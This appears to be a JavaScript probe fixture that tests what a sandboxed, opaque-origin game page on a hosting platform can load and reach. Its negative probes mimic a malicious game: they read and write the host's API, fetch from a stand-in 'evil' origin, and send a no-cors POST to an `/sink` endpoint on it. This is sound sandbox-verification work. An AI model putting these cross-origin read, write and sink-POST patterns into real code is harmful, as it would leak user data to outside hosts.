/**
 * ESM entry of the M0 S-A1 multi-file probe package.
 *
 * Runs inside `sandbox="allow-scripts"` (opaque origin) in a real DSH page.
 * Every probe step records what actually happened (HTTP status via responses,
 * load/decode/canvas results, blocked network attempts) into
 * `window.__ASSETS_PROBE__`; the probe driver reads it over CDP. Failures are
 * captured, never thrown, so one blocked asset cannot hide the rest.
 *
 * Query parameters `host` / `evil` are probe-only: the driver passes the real
 * DSH origin and a third-party origin so the fixture can attempt the negative
 * cross-origin requests a malicious game would try.
 */
import { MODULE_ID, loadLevel, levelSignature } from './level-loader.mjs';

const params = new URLSearchParams(location.search);
const HOST = params.get('host') || '';
const EVIL = params.get('evil') || '';
const VARIANT = params.get('variant') || 'none';

const startedAt = Date.now();
const probe = {
  variant: VARIANT,
  urlOrigin: location.origin,
  documentOrigin: window.origin,
  opaqueOrigin: window.origin === 'null',
  hrefPath: `${location.pathname}${location.search.replace(/launch=[^&]+/, 'launch=<redacted>')}`,
  classic: null,
  staticModule: null,
  css: null,
  image: null,
  imageNoCors: null,
  levels: null,
  head: null,
  dynamicImport: null,
  entryOneShot: null,
  entryResourceRepeat: null,
  audio: null,
  audioGesture: null,
  hostApi: null,
  hostApiWrite: null,
  hostApiImage: null,
  external: null,
  evil: null,
  evilImage: null,
  evilPost: null,
  canvas: null,
  cspViolations: [],
  consoleErrors: [],
  steps: [],
  done: false,
};

window.addEventListener('error', (event) => {
  probe.consoleErrors.push({ kind: 'error', message: String(event.message || event.type) });
});
window.addEventListener('unhandledrejection', (event) => {
  probe.consoleErrors.push({ kind: 'unhandledrejection', message: String((event.reason && event.reason.message) || event.reason) });
});
document.addEventListener('securitypolicyviolation', (event) => {
  probe.cspViolations.push({
    directive: event.violatedDirective,
    effectiveDirective: event.effectiveDirective,
    blockedURI: String(event.blockedURI || '').slice(0, 160),
    disposition: event.disposition,
  });
});

const withTimeout = (promise, ms, label) =>
  Promise.race([
    promise,
    new Promise((resolve) => setTimeout(() => resolve({ timeout: true, label }), ms)),
  ]);

async function step(name, fn) {
  const at = Date.now();
  try {
    const value = await fn();
    probe.steps.push({ name, ok: true, ms: Date.now() - at, value });
    return value;
  } catch (error) {
    const detail = { message: String((error && error.message) || error), name: error && error.name };
    probe.steps.push({ name, ok: false, ms: Date.now() - at, error: detail });
    return { error: detail };
  }
}

function mediaEvent(target, eventName, ms) {
  return withTimeout(
    new Promise((resolve) => {
      if (eventName === 'canplay' && target.readyState >= 3) return resolve({ alreadyReady: true });
      target.addEventListener(eventName, () => resolve({ event: eventName }), { once: true });
      target.addEventListener('error', () => resolve({ error: 'media-error' }), { once: true });
    }),
    ms,
    eventName
  );
}

function imageLoaded(img, ms) {
  return withTimeout(
    new Promise((resolve) => {
      if (img.complete && img.naturalWidth > 0) return resolve({ complete: true, naturalWidth: img.naturalWidth });
      img.addEventListener('load', () => resolve({ complete: true, naturalWidth: img.naturalWidth }), { once: true });
      img.addEventListener('error', () => resolve({ complete: false, error: 'img-error' }), { once: true });
    }),
    ms,
    'image'
  );
}

function pixelProbe(canvas, img) {
  const context = canvas.getContext('2d');
  context.clearRect(0, 0, canvas.width, canvas.height);
  context.drawImage(img, 0, 0, 32, 32);
  const data = context.getImageData(0, 0, 32, 32).data;
  let nonTransparent = 0;
  for (let i = 3; i < data.length; i += 4) if (data[i] > 0) nonTransparent += 1;
  return { readable: true, nonTransparent };
}

async function main() {
  // --- class + ESM resolution -------------------------------------------------
  probe.classic = await step('classicScript', async () => ({ marker: window.__PROBE_CLASSIC__ || null }));
  probe.staticModule = await step('staticEsmImport', async () => ({ moduleId: MODULE_ID }));

  // --- CSS -------------------------------------------------------------------
  probe.css = await step('stylesheet', async () => {
    const sheets = document.styleSheets.length;
    const bodyBackground = getComputedStyle(document.body).backgroundColor;
    const hudColor = getComputedStyle(document.getElementById('hud')).color;
    let cssRulesAccess = 'ok';
    try {
      // A cross-origin sheet's CSSOM is intentionally not readable from an
      // opaque origin; styling still applies, which is why we read computed styles.
      const rules = document.styleSheets[0].cssRules.length;
      cssRulesAccess = `ok:${rules}`;
    } catch (error) {
      cssRulesAccess = `${error.name}: ${String(error.message).slice(0, 80)}`;
    }
    return { sheets, bodyBackground, hudColor, cssRulesAccess, applied: bodyBackground !== 'rgba(0, 0, 0, 0)' };
  });

  // --- images ----------------------------------------------------------------
  probe.image = await step('imageCors', async () => {
    const img = document.getElementById('ship');
    const loaded = await imageLoaded(img, 4000);
    if (!loaded || loaded.error || !loaded.naturalWidth) throw new Error(`image did not load: ${JSON.stringify(loaded)}`);
    let decoded = false;
    try {
      await img.decode();
      decoded = true;
    } catch (error) {
      decoded = `${error.name}`;
    }
    const canvas = document.createElement('canvas');
    const pixels = pixelProbe(canvas, img);
    return { naturalWidth: img.naturalWidth, naturalHeight: img.naturalHeight, decoded, pixels };
  });

  probe.imageNoCors = await step('imageNoCors', async () => {
    const img = document.getElementById('ship-nocors');
    const loaded = await imageLoaded(img, 4000);
    if (!loaded || loaded.error || !loaded.naturalWidth) throw new Error(`image did not load: ${JSON.stringify(loaded)}`);
    const canvas = document.createElement('canvas');
    let tainted = false;
    let error = null;
    try {
      pixelProbe(canvas, img);
    } catch (readError) {
      tainted = true;
      error = `${readError.name}: ${String(readError.message).slice(0, 80)}`;
    }
    return { naturalWidth: img.naturalWidth, canvasTainted: tainted, taintError: error };
  });

  // --- fetch JSON twice (repeat GET) + HEAD ----------------------------------
  probe.levels = await step('jsonFetchTwice', async () => {
    const first = await withTimeout(loadLevel('levels/level-01.json'), 4000, 'level-1');
    if (first.timeout) throw new Error('level-01 fetch timed out');
    const second = await withTimeout(loadLevel('levels/level-01.json'), 4000, 'level-2');
    if (second.timeout) throw new Error('level-01 refetch timed out');
    return {
      firstStatus: first.status,
      secondStatus: second.status,
      signature: levelSignature(first.level),
      goal: first.level.goal,
      obstacleCount: Array.isArray(first.level.obstacles) ? first.level.obstacles.length : -1,
      repeatedReadOk: first.status === 200 && second.status === 200,
    };
  });

  probe.head = await step('headRequest', async () => {
    const response = await withTimeout(fetch('styles/game.css', { method: 'HEAD', mode: 'cors', cache: 'no-store' }), 4000, 'head');
    if (response.timeout) throw new Error('HEAD timed out');
    return { status: response.status, contentType: response.headers.get('content-type') };
  });

  // --- dynamic ESM import -----------------------------------------------------
  probe.dynamicImport = await step('dynamicEsmImport', async () => {
    const module = await withTimeout(import('./powerup.mjs'), 4000, 'dynamic-import');
    if (module.timeout) throw new Error('dynamic import timed out');
    return { powerupId: module.POWERUP_ID, applied: module.applyPowerup({ power: 1 }).power === 2 };
  });

  // --- entry credential: one-shot vs repeatable resource ----------------------
  probe.entryOneShot = await step('entryRefetchSameUrl', async () => {
    const response = await withTimeout(fetch(location.href, { mode: 'cors', cache: 'no-store' }), 4000, 'entry-refetch');
    if (response.timeout) throw new Error('entry refetch timed out');
    return { status: response.status, expected: 410 };
  });

  probe.entryResourceRepeat = await step('entryFetchWithoutLaunchCredential', async () => {
    const url = new URL(location.href);
    url.searchParams.delete('launch');
    const response = await withTimeout(fetch(url.toString(), { mode: 'cors', cache: 'no-store' }), 4000, 'entry-repeat');
    if (response.timeout) throw new Error('entry repeat fetch timed out');
    const text = await response.text();
    return { status: response.status, bytes: text.length, hasMainScript: text.includes('scripts/main.js') };
  });

  // --- audio ------------------------------------------------------------------
  probe.audio = await step('audio', async () => {
    const audio = document.getElementById('pickup');
    const canplay = await mediaEvent(audio, 'canplay', 4000);
    let duration = Number.isFinite(audio.duration) ? audio.duration : null;
    if (duration === null) {
      await mediaEvent(audio, 'loadedmetadata', 2000);
      duration = Number.isFinite(audio.duration) ? audio.duration : null;
    }
    const response = await withTimeout(fetch('assets/pickup.wav', { mode: 'cors', cache: 'no-store' }), 4000, 'wav-fetch');
    if (response.timeout) throw new Error('wav fetch timed out');
    const bytes = await withTimeout(response.arrayBuffer(), 4000, 'wav-arraybuffer');
    const AudioContextImpl = window.AudioContext || window.webkitAudioContext;
    const context = new AudioContextImpl();
    const decoded = await withTimeout(context.decodeAudioData(bytes.slice(0)), 4000, 'decodeAudioData');
    await context.close().catch(() => {});
    return {
      mediaStatus: response.status,
      mediaReadyState: audio.readyState,
      canplay,
      mediaDuration: duration,
      fetchedBytes: bytes.byteLength,
      decodedDuration: decoded && !decoded.timeout ? decoded.duration : null,
      decodedChannels: decoded && !decoded.timeout ? decoded.numberOfChannels : null,
    };
  });

  // Autoplay gate: record whether play() works before user activation.
  probe.audioGesture = await step('audioGestureGate', async () => {
    const audio = document.getElementById('pickup');
    let before = null;
    try {
      await audio.play();
      before = { played: true };
    } catch (error) {
      before = { played: false, error: `${error.name}: ${String(error.message).slice(0, 80)}` };
    }
    return { beforeGesture: before, afterGesture: null };
  });

  // --- negative security probes ----------------------------------------------
  probe.hostApi = await step('hostApiReadAttempt', async () => {
    if (!HOST) throw new Error('probe host origin missing');
    try {
      const response = await withTimeout(fetch(`${HOST}/api/game-market/health`, { mode: 'cors', cache: 'no-store' }), 4000, 'host-api');
      const text = await response.text();
      return { status: response.status, bytes: text.length, readBlocked: false };
    } catch (error) {
      return { readBlocked: true, error: `${error.name}: ${String(error.message).slice(0, 100)}` };
    }
  });

  probe.hostApiWrite = await step('hostApiWriteAttempt', async () => {
    if (!HOST) throw new Error('probe host origin missing');
    try {
      const response = await withTimeout(
        fetch(`${HOST}/api/game-market/preferences`, {
          method: 'POST',
          mode: 'cors',
          cache: 'no-store',
          headers: { 'content-type': 'application/json' },
          body: JSON.stringify({ probeWrite: true }),
        }),
        4000,
        'host-api-write'
      );
      const text = await response.text();
      return { status: response.status, bytes: text.length, writeBlocked: false };
    } catch (error) {
      return { writeBlocked: true, error: `${error.name}: ${String(error.message).slice(0, 100)}` };
    }
  });

  probe.hostApiImage = await step('hostApiNoCorsImageAttempt', async () => {
    if (!HOST) throw new Error('probe host origin missing');
    const img = document.createElement('img');
    const outcome = await new Promise((resolve) => {
      img.addEventListener('load', () => resolve({ loaded: true, naturalWidth: img.naturalWidth }), { once: true });
      img.addEventListener('error', () => resolve({ loaded: false }), { once: true });
      setTimeout(() => resolve({ timeout: true }), 3000);
      img.src = `${HOST}/api/game-market/health`;
    });
    return outcome;
  });

  probe.external = await step('externalNetworkAttempt', async () => {
    try {
      const response = await withTimeout(fetch('https://example.com/', { mode: 'cors', cache: 'no-store' }), 4000, 'external');
      if (response.timeout) return { timedOut: true, readBlocked: true };
      return { status: response.status, readBlocked: false };
    } catch (error) {
      return { readBlocked: true, error: `${error.name}: ${String(error.message).slice(0, 100)}` };
    }
  });

  probe.evil = await step('thirdPartyFetchAttempt', async () => {
    if (!EVIL) throw new Error('third-party origin missing');
    try {
      const response = await withTimeout(fetch(`${EVIL}/evil.json`, { mode: 'cors', cache: 'no-store' }), 4000, 'evil-fetch');
      if (response.timeout) return { timedOut: true, readBlocked: true };
      return { status: response.status, readBlocked: false };
    } catch (error) {
      return { readBlocked: true, error: `${error.name}: ${String(error.message).slice(0, 100)}` };
    }
  });

  probe.evilImage = await step('thirdPartyNoCorsImageAttempt', async () => {
    if (!EVIL) throw new Error('third-party origin missing');
    const img = document.createElement('img');
    const outcome = await new Promise((resolve) => {
      img.addEventListener('load', () => resolve({ loaded: true, naturalWidth: img.naturalWidth }), { once: true });
      img.addEventListener('error', () => resolve({ loaded: false }), { once: true });
      setTimeout(() => resolve({ timeout: true }), 3000);
      img.src = `${EVIL}/no-cors.png?probe=image`;
    });
    return outcome;
  });

  probe.evilPost = await step('thirdPartyNoCorsPostAttempt', async () => {
    if (!EVIL) throw new Error('third-party origin missing');
    try {
      await withTimeout(
        fetch(`${EVIL}/sink`, { method: 'POST', mode: 'no-cors', body: 'probe-no-cors-side-channel' }),
        4000,
        'evil-post'
      );
      return { sent: true };
    } catch (error) {
      return { sent: false, error: `${error.name}: ${String(error.message).slice(0, 100)}` };
    }
  });

  // --- visible canvas + CSS evidence ----------------------------------------
  probe.canvas = await step('canvasPaint', async () => {
    const board = document.getElementById('board');
    const context = board.getContext('2d');
    context.fillStyle = getComputedStyle(document.body).backgroundColor;
    context.fillRect(0, 0, board.width, board.height);
    const ship = document.getElementById('ship');
    if (ship.naturalWidth > 0) context.drawImage(ship, 16, 48, 96, 96);
    context.fillStyle = '#fff';
    context.font = '16px sans-serif';
    context.fillText(`level ${probe.levels && probe.levels.signature ? probe.levels.signature : '?'}`, 8, 24);
    const hud = document.getElementById('hud');
    hud.textContent = 'orbit probe ready';
    return { width: board.width, height: board.height, hudText: hud.textContent };
  });

  probe.finishedAt = Date.now();
  probe.elapsedMs = probe.finishedAt - startedAt;
  probe.done = true;
  window.__ASSETS_PROBE__ = probe;
  console.log('ASSETS_PROBE_DONE', VARIANT, probe.origin);
  document.getElementById('hud').textContent = `probe ${VARIANT} done`;
}

// User-gesture audio unlock: the driver dispatches a real trusted click.
window.addEventListener(
  'click',
  async (event) => {
    if (!event.isTrusted) return;
    if (probe.audioGesture === null) return;
    if (probe.audioGesture.afterGesture) return;
    const audio = document.getElementById('pickup');
    const detail = { trusted: event.isTrusted };
    try {
      await audio.play();
      detail.play = 'ok';
    } catch (error) {
      detail.play = `${error.name}: ${String(error.message).slice(0, 80)}`;
    }
    try {
      const AudioContextImpl = window.AudioContext || window.webkitAudioContext;
      const context = new AudioContextImpl();
      detail.audioContextState = context.state;
      await context.close().catch(() => {});
    } catch (error) {
      detail.audioContextState = `${error.name}`;
    }
    probe.audioGesture.afterGesture = detail;
  },
  { capture: true }
);

main().catch((error) => {
  probe.fatal = `${error && error.name}: ${String(error && error.message).slice(0, 200)}`;
  probe.done = true;
  window.__ASSETS_PROBE__ = probe;
  console.log('ASSETS_PROBE_DONE', VARIANT, 'fatal');
});
